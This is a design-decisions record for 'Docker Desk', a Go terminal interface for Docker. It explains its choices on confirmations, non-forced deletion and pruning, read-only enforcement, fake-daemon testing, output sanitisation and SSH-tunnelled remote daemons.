# Decisions

Why Docker Desk is built the way it is. Every entry says what was decided, what else was on the
table, and what tipped it. Entries marked **D** were made when the spec was written (they are
also in `openspec/changes/docker-desk-workspace/design.md`); entries marked **B** were made
during the build, usually because something real contradicted an assumption — the
[journal](JOURNAL.md) tells those stories in order.

Entries marked **R** (remote daemons) and **T** (themes) belong to the second change,
`openspec/changes/remote-daemons-and-themes/`, and are collected in
[their own section](#round-two--remote-daemons-and-themes). Where one of them overturns or
relaxes a first-round decision, the older entry says so and is kept, because the reasoning it
records is still the reasoning the newer one had to answer.

Entries marked **S** (selection) belong to the third change, `openspec/changes/multi-select/`,
and are collected in [their own section](#round-three--acting-on-a-selection).

Entries marked **F** (findings) belong to the fourth change, `openspec/changes/image-findings/`,
and are collected in [their own section](#round-four--image-findings). The request asked for
decisions to be made and recorded rather than asked about; every place it left a choice open
has an entry.

Entries marked **U** (usage) belong to the fifth change, `openspec/changes/disk-space/`, and
are collected in [their own section](#round-five--space), made and recorded the same way.

Where a decision costs something, the cost is stated. Nothing here is presented as free.

---

## Shape of the product

### D1 — Go, shipped as one binary

**Decided:** write it in Go; ship a single self-contained executable.

**Alternatives:** Python + Textual (excellent widgets, but needs an interpreter environment at
run time and a GIL-bound event loop is the wrong place to absorb a 50,000-lines/s log flood);
Rust + ratatui (no toolchain on the machine, no first-party Docker client); Node + Ink (a
React reconciliation per frame is a poor fit for high-rate streams).

**Why:** Go was already installed, `~/go/bin` was already on `PATH` (so `go install` yields a
command you can type), goroutines map one-to-one onto "many independent live streams", and it
is the language of Docker's own client library (see D3).

### D2 — Bubble Tea v1 and Lip Gloss, panes written by hand

**Decided:** the UI is a Bubble Tea model: `Update(message) → state`, `View() → text`. Tables,
scrolling text, tabs and dialogs are written here; only the single-line text input comes from
the `bubbles` component set.

**Alternatives:** tview/tcell (richer widgets, but widgets own mutable state and draw from any
goroutine, which makes both frame coalescing and deterministic tests harder); Bubble Tea v2
(newer API; v1 is the long-stable line and has everything needed).

**Why:** a UI that is a plain state machine can have its safety rules tested as functions —
"after this key, zero mutating requests" — without a terminal. Bubble Tea also has a
first-class "give the terminal to something else and take it back" primitive, which the shell
needs (D16). Hand-written panes because every pane must draw from a shared ring buffer in
O(visible rows) and must be able to say "nothing changed" cheaply (D8).

**Cost:** more UI code to own (about 4,000 lines), and one import-time side effect of Bubble
Tea that cannot be turned off (B11).

### D5 — Unix sockets only; anything else is refused at launch

> **Superseded by [R1](#r1--remote-daemons-are-accepted-visibility-replaces-refusal).** The
> owner asked for remote daemons. The concern below is real and is now answered by announcing a
> remote daemon as remote, not by refusing it.

**Decided:** if the current context resolves to `tcp://`, `ssh://`, `npipe://` or anything
that is not `unix://`, the program prints the endpoint, says why, and exits without opening
the workspace.

**Alternative:** let the client library connect to whatever the context says.

**Why:** "no connecting over the network" was a stated boundary, and a context left pointing
at a remote host is one of the likeliest ways to delete things on the wrong machine. Refusing
is cheaper than being careful.

### D18 — Layout: act on the left, the engine answers on the right

**Decided:** five panes always on screen. Wide terminals (≥ 120 columns): Kinds on the left,
List over Details in the centre, Events over Jobs on the right — Jobs in the bottom corner.
Between 80 and 119 columns the right column becomes a strip under the centre so all five stay
visible. Below 80×24 a message states the minimum size.

**Why:** the request described a rhythm — "I act on one side, the engine answers on the
other" and progress "in a corner" — and the layout is that sentence drawn.

**Focus** is shown three ways at once: heavy border, accent colour, and a `◆` marker in the
title. The first and third survive `NO_COLOR`.

### D21 — Keys

Lower-case letters for everyday reversible actions (`s` start, `t` stop, `p` pause, `u`
unpause, `e` shell, `n` new, `c` connect), and deliberately awkward ones where a slip would
cost more (`K` kill, `X` prune, `D` disconnect, `R` restart, `P` pull). `d` is "remove" in
every kind. None of them acts without its confirmation, so the awkwardness is a second line of
defence, not the first. The full list is in the README and behind `?`.

### B7 — Actions also work from the Details pane

**Decided:** with the Details pane focused, the highlighted object's action keys still work.

**Alternative:** actions only from the List pane, so that "the pane I'm acting on" is always
the list.

**Why:** the common loop is "read the logs, restart it, keep reading". The Details pane's
title names the object, none of its own keys (`j k g G f w h l`) collide with an action key,
and every action still opens a dialog that names the object. Forcing a focus change first
would add a keystroke and no safety.

### B6 — The filter filters as you type

**Decided:** `/` filters rows on every keystroke; Enter keeps the filter, Esc restores what
was there before; Esc in the list clears it. (Since S5, Esc in the list first clears a
selection, then the filter, then leaves the pane.)

**Why:** a filter you have to submit before seeing its effect is a search box. Keys typed into
the filter are text and can never reach an action (tested).

### B22 — Rows are ordered so they hold still

**Decided:** containers: running/paused first, then by name. Images: by repository and tag,
untagged last. Volumes: named first, then anonymous. Networks and projects: by name.

**Alternative:** Docker's order (newest first).

**Why:** on a desk that refreshes by itself, a row that jumps is a row you act on by mistake.
The highlight follows the object's identity regardless (it is tested), but stable order means
the eye does too.

### B23 — The Info tab does not print environment variable values

**Decided:** the container summary shows how many environment variables there are, not their
values. The Inspect tab shows the daemon's full document, values included.

**Why:** environment variables are where credentials live, and a desk is often on a shared or
recorded screen. One deliberate tab switch is a reasonable price for seeing them.

---

## Talking to Docker

### D3 — Docker's own client library, not the CLI and not hand-rolled HTTP

**Decided:** every request goes through `github.com/moby/moby/client`, the current home of
Docker's Go client (its API module is 1.56, the same as the daemon here), with API-version
negotiation.

**Alternatives:**

- *Shell out to `docker …`.* Simplest. But it adds a run-time dependency on a binary, forces
  parsing human-oriented output or spawning a process per call, gives no structured errors
  (409 "in use" versus 404 "gone"), and makes many concurrent streams expensive.
- *Hand-roll HTTP over the socket.* Smallest dependency tree and full control.

**Why — the deciding argument is about what cannot be tested.** Mutating requests may never be
sent to the real daemon during development. If the request encoding were written by hand, a
fake daemon written by the same hand would faithfully mirror any misunderstanding, and the
tests would pass. With the library the Docker CLI itself uses, the encoding of every stop,
remove and exec is Docker's.

**Cost:** a larger dependency tree (OpenTelemetry arrives transitively) and a binary of about
9.5 MB.

### D4 — Context resolution re-implemented (about 100 lines) instead of importing `docker/cli`

**Decided:** `internal/dockerctx` applies the CLI's precedence itself: `DOCKER_HOST` →
`DOCKER_CONTEXT` → `currentContext` in `$DOCKER_CONFIG/config.json` → the default socket; a
named context's endpoint is read from `contexts/meta/<sha256(name)>/meta.json`.

**Alternative:** import the CLI's context store.

**Why:** the client library knows nothing about contexts, and the CLI's store would bring most
of `docker/cli` with it. The rules are small and stable. Doing it here also lets the resolver
return *where the endpoint came from*, which the header, `--check`, the help overlay and the
launch errors all print.

**Cost:** if Docker ever changes how contexts are stored, this must follow.

**Since extended (R6):** the same package now also reads a context's TLS material and applies
the CLI's TLS environment variables. The cost is correspondingly larger, and is checked: a test
has the real `docker` CLI write a context with certificates and use it, and the desk must then
reach the same daemon through it.

### D6 — A narrow `Engine` interface with the desk's own types; no `force` anywhere

**Decided:** the rest of the program depends on one interface returning small value types
(`Container`, `Image`, `Volume`, `Network`, `Event`, …). Every mutating method takes the
identifier of exactly one object. There is no force parameter, no cascade flag, no "all".

**Why:** library churn stays in one file; read-only mode becomes a wrapper (D17); and a forced
removal cannot be requested by mistake because it cannot be expressed. `TestNeverForces` reads
what actually went over the wire to confirm it.

### B1 — "Dangling" is the daemon's verdict, not a guess

**Found:** on this machine (containerd image store) an image pulled by digest reports
`RepoTags: ["kicbase/stable@sha256:…"]` — no tag — and yet the daemon's own `dangling=true`
filter does not include it.

**Decided:** the engine asks the daemon which images are dangling (a second, filtered list
call) and carries that flag on each image. A digest-only reference is displayed as repository
+ `<none>` and is removable by that reference.

**Alternative:** infer "dangling" from an empty `RepoTags`. That is what the first version did;
it would have offered an image for pruning that Docker does not consider dangling.

**Cost:** one extra request per image refresh.

### B18 — HTTP 403 from the daemon is treated as a refusal, like 409

**Found:** Docker answers most "not in that state" refusals with 409 but network ones
("has active endpoints", "is a pre-defined network") with 403.

**Decided:** both are classified as "refused because of the object's state". The message shown
is always the daemon's own sentence.

---

## Making it safe

### D11 — A mutation is a *plan* built by pure code, then shown, then executed verbatim

**Decided:** `internal/plan` turns (action, target identifier, snapshot of the engine) into a
`Plan` value: title, exact target, effect sentences, the list of steps, blockers, and how it
must be confirmed. The dialog renders that value. The job executes that same value.

**Alternative:** the usual shape — the key handler checks a few things and calls the API after
a yes/no prompt.

**Why:** with one value shown and executed there is no second lookup between seeing and doing.
"Confirm the exact object" and "a prune destroys only what it showed" stop being things to be
careful about and become things that are true by construction. And because planning is pure,
every rule is tested exhaustively without a UI or a daemon.

### B14 — Plans are built from a fresh snapshot, not from the lists on screen

**Decided:** pressing an action key captures the highlighted object's identifier, then reads
the four lists from the daemon again and plans from that. While that read is in flight further
action keys are ignored.

**Alternative:** plan from the data already on screen (instant, no request).

**Why:** the screen can be a few hundred milliseconds — or, when disconnected, minutes — out
of date, and "is it in use?" is exactly the kind of fact that goes stale. The cost is a few
milliseconds and four `GET`s per action. When the daemon cannot be read, no dialog opens at
all; the desk says so.

### D12 — Three ways to confirm, scaled to what cannot be undone

| Tier | Actions | To proceed |
| --- | --- | --- |
| confirm | start, stop, restart, pause, unpause, kill, connect, disconnect, stop project | press `y`. Enter does nothing; `n` or Esc cancels |
| typed | remove container / image / volume / network, remove project, every prune | type the word shown (`remove` or `prune`), then Enter |
| form | pull image, create volume, create network, open shell | type (or accept) the value, then Enter |

**Alternatives considered:**

- *Type the object's name* (the GitHub way). Strongest — but dangling images have no name and
  anonymous volumes are 64 hex characters. A control that is unbearable gets resented and
  worked around. A fixed word still cannot be produced by a stray key or key-repeat, and it is
  the dialog — not the typing — that carries the object's identity.
- *`y` for everything.* Then `d`,`y` becomes one muscle-memory gesture for deletion.
- *Enter confirms, with "Cancel" focused by default.* One mis-aimed Tab away from consent.

**Cost:** friction on a frequent action (removing a container is seven keys and Enter). That is
the intended trade.

All three tiers also require that the input arrives *after* the dialog could be read — see
B25 and B26, added after the review.

### B10 — A typed confirmation shows no placeholder

**Found** while reading a captured screen: the input's dim placeholder showed the word to
type, which in a plain-text capture — and at a glance in a terminal — looked as if it had
already been typed.

**Decided:** the input starts empty. Nothing in a confirmation may look pre-filled.

### D13 — Nothing is forced; "in use" is decided twice

**Decided:** in-use is checked when the plan is built — a blocker makes the dialog a refusal
with no way to proceed — and again by the daemon, because every delete is sent without force
and Docker answers "in use" itself. `kill` is the one deliberately forceful action, and it is
an explicit request.

**Why twice:** the plan's check gives a refusal that names what is using the object before
anything is sent; the daemon's check covers the gap between the dialog and the request.

### D14 — A prune deletes an exact set; Docker's prune endpoints are never called

**Decided:** the plan computes the candidates, the dialog lists every one, and the job deletes
exactly those identifiers, one non-forced request each.

**Alternative:** preview with list calls, then call `/…/prune`.

**Why:** Docker's prune has no dry run and decides what to delete at the moment it runs. A
preview followed by `/prune` can destroy things that became eligible after the preview. Here,
something created after the preview is simply not in the set (tested), and something that
became in-use is refused by the daemon and reported per object while the rest continue
(tested).

**"Unused" is also defined more conservatively than Docker's.** A volume or network referenced
by any container — *including stopped ones* — is in use. On the machine this was built on,
that is the difference between keeping and deleting the `minikube` network, which only an
exited container references and which `docker network prune` would remove.

**Cost:** N requests instead of one; no reclaimed-space figure for volumes; and the desk
prunes less than `docker … prune` does. The dialog says so.

### B17 — Pruning a tagged image is one step per reference

**Decided:** in "all unused" scope, an unused image with several tags appears as one row per
tag, each an untag; the last one deletes the image.

**Alternative:** one row per image, deleted by ID.

**Why:** deleting a multi-tag image by ID requires force ("referenced in multiple
repositories"), and nothing is forced. It also keeps the preview literal: every row is one
request.

### B16 — Untagging one of several references is allowed even when the image is in use

**Decided:** if an image has other references, removing one is only an untag; it is not
blocked by containers using the image, and the dialog is titled "Untag image" and says the
data stays.

**Why:** that is what Docker does, nothing is lost, and refusing would make a harmless tidy-up
impossible while a container runs.

### D15 — Compose is a label, and "remove project" removes containers only

**Decided:** a project is the set of containers carrying the same
`com.docker.compose.project` label. Stop stops the running ones. Remove removes the containers
— refused while any is running — and nothing else. Networks and volumes carrying the project's
label are *named* in the confirmation and left in place.

**Alternative:** also remove the project's networks, which is what `compose down` does.

**Why:** the request was explicit — "no magic over compose files… no down". A volume is data;
a network removal is exactly the `down` that was not wanted. They stay visible under their own
kinds, where they can be removed or pruned deliberately.

### D17 — Read-only mode is enforced below the UI, twice

**Decided:** `--read-only` (a) wraps the engine so every mutating method, and exec, returns
`ErrReadOnly` without calling the client, and (b) installs a hook on the HTTP client that
rejects any request that is not `GET` or `HEAD` before it is sent.

**Why two layers:** the wrapper is the designed path; the hook means a future code path that
forgets the wrapper still cannot mutate. A reflection test fails if a new mutating method is
added to the interface without being covered. This is what made it safe to run the real
program against the real daemon during development.

### B25 — A confirmation ignores what proceeds for its first quarter of a second

**Found** by the independent review (B30): the confirmation rules said *which* key consents but
not *when*. `t` followed at once by `y` — muscle memory, or keys typed ahead while the machine
was busy — consented to a dialog nobody had read.

**Decided:** a confirmation, the container picker and the shell form (whose command is
pre-filled) ignore the input that proceeds — `y`, text for the typed word, Enter — until they
have been open for 250 ms. Esc is never delayed.

**Alternative:** no delay. That is what the design chose at first, because time-dependent
behaviour makes tests awkward. The review changed the weighing: without it "stop and make me
confirm" could be satisfied by a two-key reflex.

**Cost:** a key pressed too early is silently ignored and has to be pressed again; tests carry
a knob to shorten or disable the delay, and the end-to-end tests wait as a person would.

### B26 — Any key pressed while a confirmation is being prepared drops it

**Found** by the review, and the most serious finding: planning reads the daemon first (B14),
so a dialog opens a moment after its action key. If the operator pressed `t` and then started
typing a filter — say `/mysql` — the dialog could open under their fingers and the `y` of
"mysql" would stop a container.

**Decided:** a pending confirmation exists only as long as the operator does nothing else. Any
key pressed before it appears drops the request (the status line says so), and the key is then
handled normally. In addition a confirmation never replaces another overlay, an answer to
anything but the latest request is discarded, and closing a dialog abandons whatever was still
being computed for it. While a request is pending the status line says a confirmation is about
to open, and that takes precedence over any other message.

**Alternative:** block all keys while a plan is being prepared. Simpler, but it freezes the
desk for as long as a slow daemon takes to answer, which is exactly when the operator most
wants to do something else.

### B27 — Nothing can be acted on while the desk cannot be drawn

**Found** by the review: below 80×24 the desk shows only "terminal too small", but keys were
still routed. `t`, `y` stopped the highlighted container with nothing on screen, and a dialog
that was open when the window shrank could be confirmed blind. Removing the fix makes the test
fail with a real `POST …/stop` in the fake's log.

**Decided:** while the terminal is too small (or its size is not yet known) only quitting is
accepted. An open dialog stays open and reappears, unconfirmed, when the window grows back.

### B28 — Steps addressed by a name are pinned to the object that was shown

**Found** by the review: containers and networks are addressed by immutable IDs, but an image
reference and a volume name are *names*. Between the dialog and the request a tag can be moved
to another image by a rebuild, or a volume removed and recreated — and the daemon would then
act, without complaint, on an object nobody was shown.

**Decided:** such steps carry a pin — the image ID the reference pointed at, or the volume's
creation time — and `Execute` re-reads it immediately before the request, refusing if it
changed. Two related promises are checked at the same moment: an *untag* confirmed as "the
image data stays" is refused if the reference has become the image's last one, and a prune
step on a tagged image is refused if a container now uses the image (the daemon refuses to
*delete* an in-use image but not to untag it, so "left alone" has to be enforced here).

**Limits, stated:** the check and the request are two calls, so the window shrinks from
"however long the dialog was open" to a few milliseconds; it does not close. A volume's
creation time has one-second resolution. Neither can be fixed from the client: the Engine API
has no "delete this reference only if it still points at X".

**Cost:** one or two extra `GET`s per such step.

### B8 — Cancelling a job needs no confirmation

**Decided:** `c` on a running job cancels it at once.

**Why:** the rule is that no single key *changes or deletes* anything. Cancelling only ever
stops further requests from being sent; it cannot make the daemon do something. What had
already been done is listed in the job's output.

### B19 — Ctrl+C is never consent

**Decided:** with jobs running, `q` or Ctrl+C opens a dialog that names them; only `y` quits.
Pressing Ctrl+C again does nothing.

**Why:** Ctrl+C is the key people hammer. Quitting cancels running jobs, which for a
half-finished multi-object job is a decision, not a reflex.

---

## Staying responsive

### D8 — Live data never travels through the UI's message queue

**Decided:** each stream (logs, each container's statistics, events, job progress) is read by
its own goroutine into a fixed-capacity ring buffer that drops its oldest entry, and bumps an
atomic version counter. Nothing is sent to the UI. The UI has one 50 ms frame tick; on a tick
it compares version counters with the ones it last drew and, if none moved, reuses the cached
frame. Drawing a pane copies only the rows that will be visible.

**Alternatives:**

- *A message per line, perhaps batched.* Key latency stays coupled to stream volume through
  the shared queue, and batch windows become one more thing to tune.
- *Back-pressure the daemon* (stop reading when behind). A follow view wants the *latest*
  output; blocking the reader makes the daemon buffer and the view show stale lines.

**Why:** key presses are then the only traffic on a queue that streams never write to, so
their latency is one `Update` and one `View`, whatever the streams are doing. Measured: with
300,000 log lines per second arriving, 29 frames and 29 queue messages in 1.5 s, and a key
takes about a millisecond to take effect ([TESTING.md](TESTING.md)).

**Bounds:** 5,000 log lines; 2,048 bytes per line (longer output is split, never cutting a
character in half); 1,000 events; 120 statistics samples per container; 50 jobs with 500 output
lines each.

**Cost:** under a flood the log view is a window onto the newest 5,000 lines, not a complete
record. The view says how many older lines have scrolled out.

### D9 — Lists refresh on engine events (rate-limited) plus a slow poll

**Decided:** an engine event marks the kinds it affects; each list is refreshed at most once
per 150 ms and never while a refresh of it is in flight; a 5 s poll covers what events do not
report (the "Up 3 minutes" text, anything missed across a reconnect). Responses carry a
sequence number so a slow old one cannot overwrite a newer one.

**Measured:** 101 events in a burst cause one or two container-list requests.

### D10 — Every mutation is a job, even a fast one

**Decided:** a job is a function with a context and a reporter; the manager keeps a bounded
ledger. `start` on a container is a job just as a pull is.

**Why:** one code path, one place errors land, nothing that can block the desk — and the Jobs
pane becomes a record of everything the desk asked the daemon to do, with the daemon's answer.
A panic inside a job is caught and becomes a failed job rather than a broken terminal.

### D19 / B9 — Statistics for every running container, capped at 32 streams

**Decided:** one statistics stream per running container feeds the CPU and MEM columns and the
Stats tab. At most 32 streams are open; the highlighted container is always one of them; rows
beyond the cap show `n/c`. Only *running* containers are streamed.

**Why:** "is it actually dying" is a question about all containers at once, which is what
`docker stats` answers. The cap keeps a host with hundreds of containers from opening hundreds
of streams.

### D20 — Container output is sanitised before it is drawn

**Decided:** everything except colour (SGR) sequences is removed from log lines: cursor
movement, screen clears, alternate-screen switches, window-title and clipboard (OSC)
sequences, terminal resets, C1 controls. Tabs are expanded, invalid UTF-8 replaced. With
`NO_COLOR`, colour is stripped too.

**Why:** container output is untrusted bytes written to the operator's terminal. Without this
a container could repaint other panes, retitle the window or write to the clipboard.

### B21 — A log stream that ended is reopened when its container starts again

**Found:** the daemon closes a log follow when the container exits.

**Decided:** the view keeps the last output and says the container is not running; when the
engine reports that container starting, the stream is reopened with a fresh tail. Reopening
replaces the buffer rather than appending, so no line appears twice.

### B5 — An event line puts the outcome right after the action

**Found** on the first real screen: `container die shop-web-1 exi…` — the exit code, the one
thing you want from a `die` event, was what the narrow pane cut off.

**Decided:** `15:04:05 ctr die exit 137 web`: time, a three-letter kind, the action with its
outcome (exit code, signal), then the name. Network events show the container's *name*
(resolved from the list), not its ID.

**Cost:** `ctr`/`img`/`vol`/`net` instead of the full words.

### B4 — No character that some terminals draw two cells wide

**Found:** `▶`, `⏸` and `⚠` have an emoji presentation; some terminals draw them double-width
whatever the width tables say, which tears every border to their right.

**Decided:** they were replaced (`◆`, `‖`, `▲`), and a test scans every non-ASCII character in
the UI's source and rejects any that is not one cell wide or lies in an emoji-presentation
range. A second test checks that every line of every frame, at nine terminal sizes, every
kind, tab and focus, is exactly the terminal's width.

---

## The shell

### D16 — A native exec session handed the terminal through `tea.Exec`

**Decided:** the session is implemented against the API — exec create, hijacked attach,
resize — and wrapped as a `tea.ExecCommand`. Bubble Tea leaves the alternate screen; the
session puts the terminal into raw mode, copies bytes both ways and forwards `SIGWINCH`; on
every exit path the terminal state is restored before Bubble Tea re-enters the desk.

**Alternative:** spawn `docker exec -it`. A few lines — but it adds a run-time dependency on
the CLI and a second, independent resolution of "which daemon" that could disagree with the
header.

**Details that matter:**

- The keyboard reader is *cancellable*. A goroutine left blocked reading the terminal would
  swallow the first key pressed back at the desk; the pseudo-terminal test proves the next
  reader gets the key.
- The default command is `sh -c 'command -v bash >/dev/null 2>&1 && exec bash || exec sh'`,
  shown in a form and editable before anything runs.
- Opening a shell is disabled in read-only mode: it runs a process inside a container.

### B29 — The shell session can always be left

**Found** by the review: while the terminal is handed over, Bubble Tea ignores signals and its
event loop is blocked inside the session. A daemon that accepted the exec request and never
answered would hang the program with no key that helps; a daemon that went silent mid-session
(connection open, no data) would be indistinguishable from a quiet shell.

**Decided:**

- starting is bounded: 15 s for the daemon to create and attach, then the desk returns with a
  message;
- **Ctrl-] three times** ends the session locally, without the daemon's cooperation (the
  banner says so; one or two are ordinary bytes for the remote program);
- `SIGTERM` and `SIGHUP` end the session cleanly instead of being lost, so that killing it
  from another terminal does not leave the tty raw;
- when the session ends, however it ends, mouse reporting, bracketed paste, application cursor
  keys, the alternate screen and a hidden cursor are switched off — a full-screen program
  inside a container that dies has no chance to clean up after itself;
- keys typed blind while the session was ending are discarded rather than delivered to the
  desk (Linux).

### B2 — "The shell could not start" is detected from the stream and the exit code

**Found** by running the real `docker` CLI against the fake daemon: the fake answered an exec
of a missing executable with HTTP 400, and the CLI said "unable to upgrade to tcp, received
400". The real daemon upgrades the connection *first*, writes the error into the stream,
closes it, and reports exit code 126/127 through exec inspect.

**Decided:** the fake was corrected, and the session keeps the last 2 KiB of output; a session
that ends within two seconds with exit code 126 or 127 is reported as "could not start"
together with the daemon's own sentence from the stream.

---

## Proving it without touching anything real

### D7 — The test double is a fake *daemon*, not a fake interface

**Decided:** `internal/fakeengine` is an in-memory Docker Engine serving the real HTTP API on
a unix socket: lists, inspect, lifecycle, in-use refusals with Docker's status codes and
wording, events, the multiplexed log framing with follow and a configurable flood rate,
statistics, pull progress, exec with connection hijacking and a small scripted shell. Tests
point the real client library at it. It records every request, which is how tests assert
"nothing was sent".

**It is cross-checked from both directions**, because a fake written next to the code can agree
with the code and still be wrong:

1. the real `docker` CLI is run against the fake (`make crosscheck`, 61 assertions), so the
   fake's behaviour is validated by Docker's own client;
2. the desk's engine layer — and then the whole program, read-only — is run against the real
   daemon, so its decoding is validated by Docker's own server.

**Alternatives:**

- *Mock the `Engine` interface.* Far less code; leaves the client-library integration, the
  stream framing and the exec hijack untested.
- *Throwaway containers on the real daemon.* Closest to reality — but it creates objects on a
  machine holding things that matter, needs an image pull, and one bug in test clean-up
  becomes a real deletion. Rejected: the real daemon received no mutating request at all.
- *Docker-in-Docker.* Needs a privileged container on the same daemon; same objection.

**Cost, stated plainly:** the mutating paths had never run against a real daemon before the
first real use. What stands in for that is the chain above — Docker's client encodes every
request, and Docker's CLI validates the fake those requests were tested against.

### B20 — The sandbox is a separate program, not a `--demo` flag

**Decided:** the fake daemon ships as `fake-dockerd`, and `make sandbox` starts it and points
the desk at it through `DOCKER_HOST`.

**Alternative:** `docker-desk --demo`.

**Why:** the product talks to exactly one daemon chosen by the Docker context, and should have
no second way to choose. In the sandbox the header shows the sandbox socket like any other
endpoint — the same mechanism you rely on to know your blast radius.

**Since relaxed (R7):** `--host` and `--context` now exist. They are the Docker CLI's own two
ways of naming a daemon, not a product-specific one, and the argument against `--demo` stands.

### B3 — Tests cannot open a read-write connection to a real daemon

**Decided:** every test package that builds an engine calls `engine.InstallTestGuard()` from
`TestMain`. From then on `engine.New` refuses a read-write connection to any socket outside
the system temporary directory, and `DOCKER_HOST` points at a path that cannot exist.

**Why:** "the tests only use the fake" was true by convention. This makes it true by
construction: the two opt-in tests that visit a real daemon can only open it read-only.

**Since extended (R9)** to TCP addresses and SSH tunnels, which would otherwise have been two
ways around it.

### B11 — The pseudo-terminal harness answers the questions a real terminal answers

**Found:** every end-to-end test took five seconds to start. Bubble Tea asks the terminal for
its background colour at import time and waits up to five seconds for a reply; the emulator
used by the harness never replied.

**Decided:** the harness answers the background-colour and cursor-position queries, as real
terminals do. (A second harness bug found the same day: a read from the pseudo-terminal can end
in the middle of a multi-byte character; the harness now only hands the emulator whole
characters. Before that, borders occasionally appeared torn in captured screens when nothing
was wrong with the program.)

**What it means for you:** in tmux and screen the query is skipped; in any terminal that
answers cursor-position reports — all the usual ones — there is no wait. A terminal that
answers neither would pause for five seconds at start-up. `NO_COLOR=1` also skips it.

### D22 — What counts as proof

Six layers, each catching what the one before cannot: unit tests of the pure parts; the real
client library against the fake daemon; the UI model driven key by key with assertions on the
fake's request log; a flood test for the responsiveness bounds; the real binary on a
pseudo-terminal with a terminal emulator; and the real binary, read-only, against the real
daemon with a before/after comparison of everything on it. Details and numbers:
[TESTING.md](TESTING.md).

---

### B30 — An independent review of the mutation path, before calling it done

**Decided:** after the tests were green, the code between a key press and a mutating request
(`plan`, the UI's keys/dialogs/actions, `engine`, `jobs`, `shell`) was handed to a separate
reviewer with the rules it is supposed to obey and no account of why I believed it did. It was
asked for concrete sequences that break a rule, not for opinions.

**Why:** every test until then had been written by the author of the code, against the
author's idea of how it could fail. For a tool that deletes things that is not enough.

**What came back, and what was done:**

| Finding | Outcome |
| --- | --- |
| A confirmation that opens late can be confirmed by keys typed for something else | fixed — B26, B25 |
| Dialogs are live but not drawn in a too-small terminal | fixed — B27 |
| The action menu names one object and acts on the highlight | fixed: the menu acts on the row it captured, or reports it gone |
| A recomputed prune preview appears after the operator moved on | fixed — B26 |
| Image and volume steps addressed by name are not pinned | fixed — B28 |
| Prune-all can strip a tag from an image that became in use | fixed — B28 |
| Cancelling relabels a job that failed by itself; failures before a cancel are lost | fixed: only a job that stopped *because* it was cancelled is "cancelled"; the output counts succeeded, failed and not attempted |
| A stalled daemon during a shell leaves no way out; terminal modes left on | fixed — B29 |
| The shell form is pre-filled, so `e`, Enter runs it without typing | kept: the spec asks for the command to be shown and editable, and a shell deletes nothing — but Enter is now subject to B25 |
| Untagging an in-use image is not blocked | kept (B16) — the dialog now says which containers keep using the image |
| A prune also removes untagged parent layers that are not listed | kept: that is what removing an image means; the dialog now says so instead of "exactly the images listed" |

Each fix has a test that reproduces the reviewer's sequence, and for the three most serious
the test was confirmed to fail when the fix is taken out.

## Round two — remote daemons and themes

The request: *"existing docker desk can only connect to local docker daemon. make it can
connect to remote docker daemon through ssh or any other communication protocols. document all
changes and decisions. additional task: applying theme."*

Two readings were needed, and both are decisions:

- *"ssh or any other communication protocols"* was read as: the protocols the Docker CLI itself
  uses to reach a daemon on Linux and macOS — SSH, and TCP with or without TLS. Not an
  invented protocol, and not Windows named pipes.
- *"applying theme"* was read as: give the desk colour themes, selectable and switchable, and
  apply one. Not a redesign of the layout.

### R1 — Remote daemons are accepted; visibility replaces refusal

**Decided:** an endpoint may be `ssh://` or `tcp://`. Nothing gates it: no flag, no extra
confirmation. Instead, a daemon that is not this machine's own socket is *announced* — a tag
next to the endpoint in the header (`[REMOTE ssh]`, `[REMOTE tls]`, `[REMOTE tls, UNVERIFIED]`,
`[REMOTE tcp, NO TLS]`), never dropped, and repeated in the "daemon" line of every
confirmation, form and picker, in the help, in `--check` and on the "terminal too small"
screen.

**Alternatives:**

- *Keep refusing* (D5). Not what was asked.
- *An opt-in flag on top of the context* (`--remote`). A context or `--host` is already an
  explicit choice of daemon. A flag that must be given every time ends up in an alias and
  protects nothing.
- *A typed confirmation for every change on a remote daemon.* It would make restarting a
  container on the server you are looking at as heavy as deleting a volume. D12 rejected
  "type the object's name" because a control that is unbearable gets worked around; the same
  applies.

**Why:** the dialog is where the decision is made, and it is the one thing every rule of the
desk already relies on being read (B25 exists to make sure it can be). Putting "this is
another machine" there costs nothing on a local daemon and cannot be missed on a remote one.

**Cost:** D5's protection was a refusal; this one is a sentence. A context left pointing at
production will now open production. It will say so on the top line and in each dialog, and
`--read-only` remains the stronger guard — but nothing stops the operator who does not read.
This is the largest thing given up in this change, and it was given up on request.

### R2 — SSH: one forwarded socket, not `docker system dial-stdio` per connection

**Decided:** for `ssh://[user@]host[:port][/path]` the desk runs **one**
`ssh -N -L <private local socket>:<remote socket>` and points its ordinary unix-socket client
at the local end. The remote socket is `/var/run/docker.sock` unless the URL names another.

**Alternative — the Docker CLI's way:** run `ssh host docker system dial-stdio` once per HTTP
connection and speak HTTP over that process's stdin and stdout. It has one real advantage:
"whatever works with `docker -H ssh://…` works here", including servers that forbid
forwarding.

**Why not:** the desk is not a command. With twelve running containers it holds an event
stream, a log stream, twelve statistics streams and a few request connections, and opens one
more for a shell; the cap from D19 is 32 statistics streams. Per-connection ssh means an ssh
process, a key exchange and an authentication for each of them — and `sshd`'s defaults drop
connections beyond ten being set up at once (`MaxStartups 10:30:100`), while the usual cure,
connection sharing, is capped at ten sessions per connection (`MaxSessions 10`). The CLI gets
away with it because a command opens one or two connections. The desk would start flaky and
stay slow: every confirmation reads four lists first (B14), each a fresh login.

Forwarded socket connections are *channels*, not sessions, and are not counted against either
limit. Measured against a real `sshd`: one tunnel, one login, 40 concurrent statistics streams
plus the event stream, a mutation and an interactive shell (`TestRealSSH`).

A second consequence, in the operator's favour: the remote machine does not need the `docker`
CLI. And one that made R4 possible: the tunnel is a process started *before* the desk takes
the terminal.

**Cost — three things the CLI's way does not ask for:**

- *The SSH server must allow forwarding to unix sockets.* It does by default. Found by trying
  against a real `sshd`: it is refused not only by `AllowStreamLocalForwarding no` and
  `DisableForwarding yes` but also by `AllowTcpForwarding no` and `PermitOpen none`. On such a
  server `docker -H ssh://…` works and the desk does not; the launch message names the
  settings (R8). A fallback to the CLI's way was considered and left out: two transports to
  keep correct for the sake of servers hardened against exactly this.
- *The socket's path must be known.* The remote user's Docker context and `DOCKER_HOST` are not
  consulted. A rootless daemon is `ssh://user@host/run/user/1000/docker.sock` — the Docker
  CLI's own syntax for naming the socket — and the launch message says so when the default
  path has nothing behind it.
- *OpenSSH 6.7 or newer* (2014) on both sides.

### R3 — The system's `ssh`, not an SSH library

**Decided:** the tunnel is the operator's `ssh` program. `DOCKER_DESK_SSH` names another
program, or leading arguments (`ssh -F $HOME/.ssh/work_config`).

